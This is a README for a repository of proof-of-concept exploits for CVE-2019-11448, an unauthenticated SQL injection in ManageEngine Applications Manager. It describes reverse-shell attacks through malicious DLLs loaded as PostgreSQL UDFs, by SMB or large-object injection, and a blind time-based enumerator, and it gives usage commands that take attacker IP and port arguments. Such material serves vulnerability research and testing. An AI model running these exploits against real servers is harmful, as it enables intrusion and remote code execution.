
This repository contains multiple **proof-of-concept (PoC) exploits** for **CVE-2019-11448**, a critical **unauthenticated SQL Injection vulnerability** in the `AMUserResourcesSyncServlet` endpoint of **ManageEngine Applications Manager** (versions 11.0 to <14.0). The application's **PostgreSQL backend** allows arbitrary SQL execution and even remote code execution (RCE) via **User-Defined Functions (UDFs)**.



### Included PoCs

#### `POC_ManageEngine.py` – Reverse Shell via SMB-hosted DLL

* Creates a PostgreSQL UDF using a malicious DLL hosted on an SMB share
* Calls the UDF to execute a reverse shell
* Easiest and fastest method (requires SMB egress)

#### `LargeObjectAPI.py` – Reverse Shell via Large Object Injection

* Injects a hex-encoded DLL payload into PostgreSQL's `pg_largeobject`
* Uses `lo_export()` to write the DLL to disk
* Defines and executes the UDF for RCE
* Suitable for **egress-restricted environments** (no SMB required)

#### `BlindSQLI.py` – Blind Time-Based SQL Injection Enumerator

* Performs **blind SQLi** against the vulnerable endpoint
* Extracts string data (e.g., usernames, table names) using `pg_sleep()` delay-based logic
* Demonstrates enumeration techniques under restricted output scenarios



### Usage

```bash
# PoC 1 – Reverse Shell via SMB DLL
python3 POC_ManageEngine.py <targetIP:port> <attackerIP> <attackerPort>

# PoC 2 – Large Object Injection Method
python3 POC_ManageEngine_LO.py <targetIP:port> <attackerIP> <attackerPort>

# PoC 3 – Blind SQLi Enumeration
python3 Blind-SQLI-Time.py "<base_url_to_servlet>"
```

Example:

```bash
python3 Blind-SQLI-Time.py "https://192.168.106.113:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
```

